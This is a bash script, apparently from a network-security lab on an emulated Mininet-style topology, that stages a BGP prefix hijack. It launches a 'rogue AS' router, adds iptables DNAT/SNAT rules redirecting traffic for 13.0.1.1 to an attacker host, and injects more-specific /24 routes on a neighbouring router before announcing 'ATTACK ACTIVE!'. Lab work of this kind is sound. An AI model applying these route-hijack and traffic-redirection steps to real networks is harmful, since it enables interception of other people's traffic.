#!/bin/bash

echo "Killing any existing rogue AS"
./stop_rogue.sh
sleep 1

echo "Starting rogue AS (S4)..."
# Run both daemons in parallel
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/zebra -f conf/zebra-S4.conf -d -i /tmp/zebra-S4.pid > logs/S4-zebra-stdout 2>&1" &
PID1=$!
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/bgpd -f conf/bgpd-S4.conf -d -i /tmp/bgpd-S4.pid > logs/S4-bgpd-stdout 2>&1" &
PID2=$!
wait $PID1 $PID2

echo "Waiting 8 seconds for BGP convergence..."
sleep 8

echo ""
echo "Setting up routing and NAT on S4..."
# Enable IP forwarding
sudo python3 run.py --node S4 --cmd "sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1"

# Ensure S4 has routes to its local networks
sudo python3 run.py --node S4 --cmd "ip route add 14.0.1.0/24 dev S4-eth1 2>/dev/null || true"
sudo python3 run.py --node S4 --cmd "ip route add 14.0.2.0/24 dev S4-eth2 2>/dev/null || true"
sudo python3 run.py --node S4 --cmd "ip route add 14.0.3.0/24 dev S4-eth3 2>/dev/null || true"

# Verify connectivity from S4 to h4-1
echo "Testing S4 -> h4-1 connectivity..."
sudo python3 run.py --node S4 --cmd "ping -c 1 14.0.1.1 > /dev/null 2>&1" && echo "  ✓ S4 can reach h4-1" || echo "  ✗ S4 cannot reach h4-1"

echo ""
echo "Setting up DNAT rules on S4..."
# Clear any existing rules for this destination
sudo python3 run.py --node S4 --cmd "iptables -t nat -D PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1 2>/dev/null || true"
sudo python3 run.py --node S4 --cmd "iptables -D FORWARD -d 14.0.1.0/24 -j ACCEPT 2>/dev/null || true"
sudo python3 run.py --node S4 --cmd "iptables -t nat -D POSTROUTING -s 14.0.1.0/24 -j MASQUERADE 2>/dev/null || true"

# Add fresh DNAT rules
# Redirect incoming traffic destined for 13.0.1.1 to h4-1 at 14.0.1.1
sudo python3 run.py --node S4 --cmd "iptables -t nat -A PREROUTING -d 13.0.1.1 -p tcp -j DNAT --to-destination 14.0.1.1"
sudo python3 run.py --node S4 --cmd "iptables -t nat -A PREROUTING -d 13.0.1.1 -p udp -j DNAT --to-destination 14.0.1.1"

# Allow forwarding to h4-1's network
sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -d 14.0.1.0/24 -j ACCEPT"
sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -s 14.0.1.0/24 -j ACCEPT"

# Masquerade responses back (change source from 14.0.1.1 back to 13.0.1.1)
sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.1 -d 9.0.0.0/8 -j SNAT --to-source 13.0.1.1"

echo ""
echo "Installing S4's hijacked routes on S1 (more specific prefixes)..."
# Add the more specific hijacked routes pointing to S4 as nexthop
# These will override the broader 13.0.0.0/8 route due to longest prefix match
sudo python3 run.py --node S1 --cmd "ip route add 13.0.1.0/24 via 9.0.4.2 2>/dev/null || ip route replace 13.0.1.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.2.0/24 via 9.0.4.2 2>/dev/null || ip route replace 13.0.2.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.3.0/24 via 9.0.4.2 2>/dev/null || ip route replace 13.0.3.0/24 via 9.0.4.2"

echo ""
echo "Verifying routes on S1..."
sudo python3 run.py --node S1 --cmd "ip route show | grep 13.0"

echo ""
echo "=========================================="
echo "ATTACK ACTIVE!"
echo "S4 is now hijacking 13.0.1.0/24 traffic"
echo "Requests to 13.0.1.1 redirected to 14.0.1.1"
echo "=========================================="




